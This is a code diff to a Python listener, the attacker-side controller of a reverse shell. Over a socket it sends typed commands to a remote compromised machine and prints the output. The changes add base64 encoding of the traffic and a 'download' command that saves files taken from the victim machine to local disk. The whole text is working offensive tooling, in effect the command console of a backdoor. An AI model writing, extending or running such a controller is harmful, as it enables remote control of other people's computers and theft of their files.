@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 
-import socket, json
+import socket, json, base64
 
 class Listener: 
     # Basic Listener class
@@ -15,8 +15,8 @@ class Listener:
 
     def reliable_send(self, data):
         # Safety way to send data as json
-        json_data = json.dumps(data).encode()
-        self.connection.send(json_data)
+        json_data = json.dumps(base64.b64encode(json.dumps(data).encode()).decode())
+        self.connection.send(json_data.encode())
 
     def reliable_receive(self):
         # Safety way to receive data as json, until everything income
@@ -24,10 +24,10 @@ class Listener:
         while True:
             try:
                 json_data += self.connection.recv(1024).decode()
-                return json.loads(json_data)
+                return json.loads(base64.b64decode(json.loads(json_data)).decode())
             except ValueError:
                 continue
-    
+
     def execute_remotely(self, command):
         # Method which sending, receiving data and exiting program
         self.reliable_send(command)
@@ -36,12 +36,20 @@ class Listener:
             exit()
         return self.reliable_receive()
 
+    def write_file(self, file_path, file_data):
+        # Method writing data to file
+        with open(file_path, 'wb') as file:
+            file.write(file_data)
+            return '[+] Download successful.'
+
     def run(self):
         # Method which run everythong - receiving, sendin, executing, etc.
         while True:
             command = input('>> ')
             command = command.split(" ")
             result = self.execute_remotely(command)
+            if command[0] == 'download':
+                result = self.write_file(command[1], result.encode())
             print(result)
 
 # Example
